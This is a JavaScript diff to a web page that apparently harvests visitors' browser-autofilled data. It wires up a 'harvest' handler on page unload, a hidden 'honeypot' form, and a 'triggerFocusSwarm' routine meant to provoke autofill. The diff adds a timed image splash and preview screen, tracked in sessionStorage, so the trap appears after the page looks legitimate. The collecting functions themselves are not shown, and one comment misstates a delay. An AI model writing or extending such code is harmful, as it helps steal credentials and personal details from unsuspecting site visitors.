@@ -121,18 +121,50 @@ function setupEventListeners() {
 window.addEventListener('beforeunload', harvest);
 
 // After a delay, hide the loader and show the honeypot prompt
-setTimeout(() => {
+const splashShown = sessionStorage.getItem('splashShown');
+
+if (!splashShown) {
+  // Show image splash screen for 7 seconds
+  setTimeout(() => {
+    const imageSplashContainer = document.querySelector('.image-splash-container');
+    if (imageSplashContainer) imageSplashContainer.style.display = 'none';
+
+    const previewContainer = document.querySelector('.preview-container');
+    if (previewContainer) previewContainer.style.display = 'block';
+
+    sessionStorage.setItem('splashShown', 'true'); // Set flag after splash is shown
+
+    // Existing logic for preview and honeypot containers
+    setTimeout(() => {
+      const honeypotContainer = document.querySelector('.honeypot-container');
+      if (previewContainer) previewContainer.style.display = 'none';
+      if (honeypotContainer) {
+        honeypotContainer.style.display = 'block';
+        // Set up all event listeners
+        setupEventListeners();
+        // Attempt to trigger autofill
+        triggerFocusSwarm();
+      }
+    }, 2000); // Existing 1.5 second delay for loader
+  }, 7000); // 7 second delay for the image splash screen
+} else {
+  // If splash shown, skip directly to loader and then honeypot
+  const imageSplashContainer = document.querySelector('.image-splash-container');
+  if (imageSplashContainer) imageSplashContainer.style.display = 'none';
+
   const previewContainer = document.querySelector('.preview-container');
-  const honeypotContainer = document.querySelector('.honeypot-container');
-  if (previewContainer) previewContainer.style.display = 'none';
-  if (honeypotContainer) {
-    honeypotContainer.style.display = 'block';
-    // Set up all event listeners
-    setupEventListeners();
-    // Attempt to trigger autofill
-    triggerFocusSwarm();
-  }
-}, 1500);
+  if (previewContainer) previewContainer.style.display = 'block';
+
+  setTimeout(() => {
+    const honeypotContainer = document.querySelector('.honeypot-container');
+    if (previewContainer) previewContainer.style.display = 'none';
+    if (honeypotContainer) {
+      honeypotContainer.style.display = 'block';
+      setupEventListeners();
+      triggerFocusSwarm();
+    }
+  }, 1500); // Existing 1.5 second delay for loader
+}
 
 function triggerFocusSwarm() {
   console.log('Attempting to trigger focus swarm for autofill...');
